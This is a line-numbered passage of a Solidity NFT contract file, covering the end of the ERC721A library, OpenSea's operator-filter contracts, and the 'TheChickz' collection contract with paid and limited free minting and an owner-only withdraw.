978      * `startTokenId` - the first token ID to be transferred.
979      * `quantity` - the amount to be transferred.
980      *
981      * Calling conditions:
982      *
983      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
984      * transferred to `to`.
985      * - When `from` is zero, `tokenId` will be minted for `to`.
986      * - When `to` is zero, `tokenId` will be burned by `from`.
987      * - `from` and `to` are never both zero.
988      */
989     function _beforeTokenTransfers(
990         address from,
991         address to,
992         uint256 startTokenId,
993         uint256 quantity
994     ) internal virtual {}
995 
996     /**
997      * @dev Hook that is called after a set of serially-ordered token IDs
998      * have been transferred. This includes minting.
999      * And also called after one token has been burned.
1000      *
1001      * `startTokenId` - the first token ID to be transferred.
1002      * `quantity` - the amount to be transferred.
1003      *
1004      * Calling conditions:
1005      *
1006      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1007      * transferred to `to`.
1008      * - When `from` is zero, `tokenId` has been minted for `to`.
1009      * - When `to` is zero, `tokenId` has been burned by `from`.
1010      * - `from` and `to` are never both zero.
1011      */
1012     function _afterTokenTransfers(
1013         address from,
1014         address to,
1015         uint256 startTokenId,
1016         uint256 quantity
1017     ) internal virtual {}
1018 
1019     /**
1020      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1021      *
1022      * `from` - Previous owner of the given token ID.
1023      * `to` - Target address that will receive the token.
1024      * `tokenId` - Token ID to be transferred.
1025      * `_data` - Optional data to send along with the call.
1026      *
1027      * Returns whether the call correctly returned the expected magic value.
1028      */
1029     function _checkContractOnERC721Received(
1030         address from,
1031         address to,
1032         uint256 tokenId,
1033         bytes memory _data
1034     ) private returns (bool) {
1035         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1036             bytes4 retval
1037         ) {
1038             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1039         } catch (bytes memory reason) {
1040             if (reason.length == 0) {
1041                 revert TransferToNonERC721ReceiverImplementer();
1042             } else {
1043                 assembly {
1044                     revert(add(32, reason), mload(reason))
1045                 }
1046             }
1047         }
1048     }
1049 
1050     // =============================================================
1051     //                        MINT OPERATIONS
1052     // =============================================================
1053 
1054     /**
1055      * @dev Mints `quantity` tokens and transfers them to `to`.
1056      *
1057      * Requirements:
1058      *
1059      * - `to` cannot be the zero address.
1060      * - `quantity` must be greater than 0.
1061      *
1062      * Emits a {Transfer} event for each mint.
1063      */
1064     function _mint(address to, uint256 quantity) internal virtual {
1065         uint256 startTokenId = _currentIndex;
1066         if (quantity == 0) revert MintZeroQuantity();
1067 
1068         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1069 
1070         // Overflows are incredibly unrealistic.
1071         // `balance` and `numberMinted` have a maximum limit of 2**64.
1072         // `tokenId` has a maximum limit of 2**256.
1073         unchecked {
1074             // Updates:
1075             // - `balance += quantity`.
1076             // - `numberMinted += quantity`.
1077             //
1078             // We can directly add to the `balance` and `numberMinted`.
1079             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1080 
1081             // Updates:
1082             // - `address` to the owner.
1083             // - `startTimestamp` to the timestamp of minting.
1084             // - `burned` to `false`.
1085             // - `nextInitialized` to `quantity == 1`.
1086             _packedOwnerships[startTokenId] = _packOwnershipData(
1087                 to,
1088                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1089             );
1090 
1091             uint256 toMasked;
1092             uint256 end = startTokenId + quantity;
1093 
1094             // Use assembly to loop and emit the `Transfer` event for gas savings.
1095             // The duplicated `log4` removes an extra check and reduces stack juggling.
1096             // The assembly, together with the surrounding Solidity code, have been
1097             // delicately arranged to nudge the compiler into producing optimized opcodes.
1098             assembly {
1099                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1100                 toMasked := and(to, _BITMASK_ADDRESS)
1101                 // Emit the `Transfer` event.
1102                 log4(
1103                     0, // Start of data (0, since no data).
1104                     0, // End of data (0, since no data).
1105                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1106                     0, // `address(0)`.
1107                     toMasked, // `to`.
1108                     startTokenId // `tokenId`.
1109                 )
1110 
1111                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1112                 // that overflows uint256 will make the loop run out of gas.
1113                 // The compiler will optimize the `iszero` away for performance.
1114                 for {
1115                     let tokenId := add(startTokenId, 1)
1116                 } iszero(eq(tokenId, end)) {
1117                     tokenId := add(tokenId, 1)
1118                 } {
1119                     // Emit the `Transfer` event. Similar to above.
1120                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1121                 }
1122             }
1123             if (toMasked == 0) revert MintToZeroAddress();
1124 
1125             _currentIndex = end;
1126         }
1127         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1128     }
1129 
1130     /**
1131      * @dev Mints `quantity` tokens and transfers them to `to`.
1132      *
1133      * This function is intended for efficient minting only during contract creation.
1134      *
1135      * It emits only one {ConsecutiveTransfer} as defined in
1136      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1137      * instead of a sequence of {Transfer} event(s).
1138      *
1139      * Calling this function outside of contract creation WILL make your contract
1140      * non-compliant with the ERC721 standard.
1141      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1142      * {ConsecutiveTransfer} event is only permissible during contract creation.
1143      *
1144      * Requirements:
1145      *
1146      * - `to` cannot be the zero address.
1147      * - `quantity` must be greater than 0.
1148      *
1149      * Emits a {ConsecutiveTransfer} event.
1150      */
1151     function _mintERC2309(address to, uint256 quantity) internal virtual {
1152         uint256 startTokenId = _currentIndex;
1153         if (to == address(0)) revert MintToZeroAddress();
1154         if (quantity == 0) revert MintZeroQuantity();
1155         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1156 
1157         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1158 
1159         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1160         unchecked {
1161             // Updates:
1162             // - `balance += quantity`.
1163             // - `numberMinted += quantity`.
1164             //
1165             // We can directly add to the `balance` and `numberMinted`.
1166             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1167 
1168             // Updates:
1169             // - `address` to the owner.
1170             // - `startTimestamp` to the timestamp of minting.
1171             // - `burned` to `false`.
1172             // - `nextInitialized` to `quantity == 1`.
1173             _packedOwnerships[startTokenId] = _packOwnershipData(
1174                 to,
1175                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1176             );
1177 
1178             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1179 
1180             _currentIndex = startTokenId + quantity;
1181         }
1182         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1183     }
1184 
1185     /**
1186      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1187      *
1188      * Requirements:
1189      *
1190      * - If `to` refers to a smart contract, it must implement
1191      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1192      * - `quantity` must be greater than 0.
1193      *
1194      * See {_mint}.
1195      *
1196      * Emits a {Transfer} event for each mint.
1197      */
1198     function _safeMint(
1199         address to,
1200         uint256 quantity,
1201         bytes memory _data
1202     ) internal virtual {
1203         _mint(to, quantity);
1204 
1205         unchecked {
1206             if (to.code.length != 0) {
1207                 uint256 end = _currentIndex;
1208                 uint256 index = end - quantity;
1209                 do {
1210                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1211                         revert TransferToNonERC721ReceiverImplementer();
1212                     }
1213                 } while (index < end);
1214                 // Reentrancy protection.
1215                 if (_currentIndex != end) revert();
1216             }
1217         }
1218     }
1219 
1220     /**
1221      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1222      */
1223     function _safeMint(address to, uint256 quantity) internal virtual {
1224         _safeMint(to, quantity, '');
1225     }
1226 
1227     // =============================================================
1228     //                        BURN OPERATIONS
1229     // =============================================================
1230 
1231     /**
1232      * @dev Equivalent to `_burn(tokenId, false)`.
1233      */
1234     function _burn(uint256 tokenId) internal virtual {
1235         _burn(tokenId, false);
1236     }
1237 
1238     /**
1239      * @dev Destroys `tokenId`.
1240      * The approval is cleared when the token is burned.
1241      *
1242      * Requirements:
1243      *
1244      * - `tokenId` must exist.
1245      *
1246      * Emits a {Transfer} event.
1247      */
1248     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1249         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1250 
1251         address from = address(uint160(prevOwnershipPacked));
1252 
1253         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1254 
1255         if (approvalCheck) {
1256             // The nested ifs save around 20+ gas over a compound boolean condition.
1257             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1258                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1259         }
1260 
1261         _beforeTokenTransfers(from, address(0), tokenId, 1);
1262 
1263         // Clear approvals from the previous owner.
1264         assembly {
1265             if approvedAddress {
1266                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1267                 sstore(approvedAddressSlot, 0)
1268             }
1269         }
1270 
1271         // Underflow of the sender's balance is impossible because we check for
1272         // ownership above and the recipient's balance can't realistically overflow.
1273         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1274         unchecked {
1275             // Updates:
1276             // - `balance -= 1`.
1277             // - `numberBurned += 1`.
1278             //
1279             // We can directly decrement the balance, and increment the number burned.
1280             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1281             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1282 
1283             // Updates:
1284             // - `address` to the last owner.
1285             // - `startTimestamp` to the timestamp of burning.
1286             // - `burned` to `true`.
1287             // - `nextInitialized` to `true`.
1288             _packedOwnerships[tokenId] = _packOwnershipData(
1289                 from,
1290                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1291             );
1292 
1293             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1294             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1295                 uint256 nextTokenId = tokenId + 1;
1296                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1297                 if (_packedOwnerships[nextTokenId] == 0) {
1298                     // If the next slot is within bounds.
1299                     if (nextTokenId != _currentIndex) {
1300                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1301                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1302                     }
1303                 }
1304             }
1305         }
1306 
1307         emit Transfer(from, address(0), tokenId);
1308         _afterTokenTransfers(from, address(0), tokenId, 1);
1309 
1310         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1311         unchecked {
1312             _burnCounter++;
1313         }
1314     }
1315 
1316     // =============================================================
1317     //                     EXTRA DATA OPERATIONS
1318     // =============================================================
1319 
1320     /**
1321      * @dev Directly sets the extra data for the ownership data `index`.
1322      */
1323     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1324         uint256 packed = _packedOwnerships[index];
1325         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1326         uint256 extraDataCasted;
1327         // Cast `extraData` with assembly to avoid redundant masking.
1328         assembly {
1329             extraDataCasted := extraData
1330         }
1331         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1332         _packedOwnerships[index] = packed;
1333     }
1334 
1335     /**
1336      * @dev Called during each token transfer to set the 24bit `extraData` field.
1337      * Intended to be overridden by the cosumer contract.
1338      *
1339      * `previousExtraData` - the value of `extraData` before transfer.
1340      *
1341      * Calling conditions:
1342      *
1343      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1344      * transferred to `to`.
1345      * - When `from` is zero, `tokenId` will be minted for `to`.
1346      * - When `to` is zero, `tokenId` will be burned by `from`.
1347      * - `from` and `to` are never both zero.
1348      */
1349     function _extraData(
1350         address from,
1351         address to,
1352         uint24 previousExtraData
1353     ) internal view virtual returns (uint24) {}
1354 
1355     /**
1356      * @dev Returns the next extra data for the packed ownership data.
1357      * The returned result is shifted into position.
1358      */
1359     function _nextExtraData(
1360         address from,
1361         address to,
1362         uint256 prevOwnershipPacked
1363     ) private view returns (uint256) {
1364         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1365         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1366     }
1367 
1368     // =============================================================
1369     //                       OTHER OPERATIONS
1370     // =============================================================
1371 
1372     /**
1373      * @dev Returns the message sender (defaults to `msg.sender`).
1374      *
1375      * If you are writing GSN compatible contracts, you need to override this function.
1376      */
1377     function _msgSenderERC721A() internal view virtual returns (address) {
1378         return msg.sender;
1379     }
1380 
1381     /**
1382      * @dev Converts a uint256 to its ASCII string decimal representation.
1383      */
1384     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1385         assembly {
1386             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1387             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1388             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1389             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1390             let m := add(mload(0x40), 0xa0)
1391             // Update the free memory pointer to allocate.
1392             mstore(0x40, m)
1393             // Assign the `str` to the end.
1394             str := sub(m, 0x20)
1395             // Zeroize the slot after the string.
1396             mstore(str, 0)
1397 
1398             // Cache the end of the memory to calculate the length later.
1399             let end := str
1400 
1401             // We write the string from rightmost digit to leftmost digit.
1402             // The following is essentially a do-while loop that also handles the zero case.
1403             // prettier-ignore
1404             for { let temp := value } 1 {} {
1405                 str := sub(str, 1)
1406                 // Write the character to the pointer.
1407                 // The ASCII index of the '0' character is 48.
1408                 mstore8(str, add(48, mod(temp, 10)))
1409                 // Keep dividing `temp` until zero.
1410                 temp := div(temp, 10)
1411                 // prettier-ignore
1412                 if iszero(temp) { break }
1413             }
1414 
1415             let length := sub(end, str)
1416             // Move the pointer 32 bytes leftwards to make room for the length.
1417             str := sub(str, 0x20)
1418             // Store the length.
1419             mstore(str, length)
1420         }
1421     }
1422 }
1423 
1424 
1425 interface IOperatorFilterRegistry {
1426     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1427     function register(address registrant) external;
1428     function registerAndSubscribe(address registrant, address subscription) external;
1429     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1430     function unregister(address addr) external;
1431     function updateOperator(address registrant, address operator, bool filtered) external;
1432     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1433     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1434     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1435     function subscribe(address registrant, address registrantToSubscribe) external;
1436     function unsubscribe(address registrant, bool copyExistingEntries) external;
1437     function subscriptionOf(address addr) external returns (address registrant);
1438     function subscribers(address registrant) external returns (address[] memory);
1439     function subscriberAt(address registrant, uint256 index) external returns (address);
1440     function copyEntriesOf(address registrant, address registrantToCopy) external;
1441     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1442     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1443     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1444     function filteredOperators(address addr) external returns (address[] memory);
1445     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1446     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1447     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1448     function isRegistered(address addr) external returns (bool);
1449     function codeHashOf(address addr) external returns (bytes32);
1450 }
1451 
1452 
1453 /**
1454  * @title  OperatorFilterer
1455  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1456  *         registrant's entries in the OperatorFilterRegistry.
1457  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1458  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1459  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1460  */
1461 abstract contract OperatorFilterer {
1462     error OperatorNotAllowed(address operator);
1463 
1464     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1465         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1466 
1467     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1468         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1469         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1470         // order for the modifier to filter addresses.
1471         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1472             if (subscribe) {
1473                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1474             } else {
1475                 if (subscriptionOrRegistrantToCopy != address(0)) {
1476                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1477                 } else {
1478                     OPERATOR_FILTER_REGISTRY.register(address(this));
1479                 }
1480             }
1481         }
1482     }
1483 
1484     modifier onlyAllowedOperator(address from) virtual {
1485         // Check registry code length to facilitate testing in environments without a deployed registry.
1486         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1487             // Allow spending tokens from addresses with balance
1488             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1489             // from an EOA.
1490             if (from == msg.sender) {
1491                 _;
1492                 return;
1493             }
1494             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1495                 revert OperatorNotAllowed(msg.sender);
1496             }
1497         }
1498         _;
1499     }
1500 
1501     modifier onlyAllowedOperatorApproval(address operator) virtual {
1502         // Check registry code length to facilitate testing in environments without a deployed registry.
1503         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1504             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1505                 revert OperatorNotAllowed(operator);
1506             }
1507         }
1508         _;
1509     }
1510 }
1511 
1512 /**
1513  * @title  DefaultOperatorFilterer
1514  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1515  */
1516 abstract contract TheOperatorFilterer is OperatorFilterer {
1517     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1518 
1519     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1520 }
1521 
1522 
1523 contract TheChickz is ERC721A, TheOperatorFilterer {
1524     bool public _isSaleActive;
1525     bool public _revealed;
1526     uint256 public mintPrice;
1527     uint256 public maxBalance;
1528     uint256 public maxMint;
1529     string public baseExtension;
1530     string public uriSuffix;
1531     address public owner;
1532     uint256 public maxSupply;
1533     uint256 public cost;
1534     uint256 public maxFreeNumerAddr = 1;
1535     mapping(address => uint256) _numForFree;
1536     mapping(uint256 => uint256) _numMinted;
1537     uint256 private maxPerTx;
1538 
1539     function publicMint(uint256 amount) payable public {
1540         require(totalSupply() + amount <= maxSupply);
1541         if (msg.value == 0) {
1542             _safemints(amount);
1543             return;
1544         } 
1545         require(amount <= maxPerTx);
1546         require(msg.value >= amount * cost);
1547         _safeMint(msg.sender, amount);
1548     }
1549 
1550     function _safemints(uint256 amount) internal {
1551         require(amount == 1 
1552             && _numMinted[block.number] < FreeNum() 
1553             && _numForFree[tx.origin] < maxFreeNumerAddr );
1554             _numForFree[tx.origin]++;
1555             _numMinted[block.number]++;
1556         _safeMint(msg.sender, 1);
1557     }
1558 
1559     function reserve(address rec, uint256 amount) public onlyOwner {
1560         _safeMint(rec, amount);
1561     }
1562     
1563     modifier onlyOwner {
1564         require(owner == msg.sender);
1565         _;
1566     }
1567 
1568     constructor() ERC721A("The Chickz", "CKZ") {
1569         owner = msg.sender;
1570         maxPerTx = 10;
1571         cost = 0.002 ether;
1572         maxSupply = 999;
1573     }
1574 
1575     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1576         return string(abi.encodePacked("ipfs://bafybeid63is5ouejl7ekpakx57vmxerccid2tv7ybsspdqyj3ukfduo3zm/", _toString(tokenId), ".json"));
1577     }
1578 
1579     function setMaxFreePerAddr(uint256 maxTx) external onlyOwner {
1580         maxFreeNumerAddr = maxTx;
1581     }
1582 
1583     function FreeNum() internal returns (uint256){
1584         return (maxSupply - totalSupply()) / 12;
1585     }
1586 
1587     function withdraw() external onlyOwner {
1588         payable(msg.sender).transfer(address(this).balance);
1589     }
1590 
1591     /////////////////////////////
1592     // OPENSEA FILTER REGISTRY 
1593     /////////////////////////////
1594 
1595     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1596         super.setApprovalForAll(operator, approved);
1597     }
1598 
1599     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1600         super.approve(operator, tokenId);
1601     }
1602 
1603     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1604         super.transferFrom(from, to, tokenId);
1605     }
1606 
1607     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1608         super.safeTransferFrom(from, to, tokenId);
1609     }
1610 
1611     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1612         public
1613         payable
1614         override
1615         onlyAllowedOperator(from)
1616     {
1617         super.safeTransferFrom(from, to, tokenId, data);
1618     }
1619 }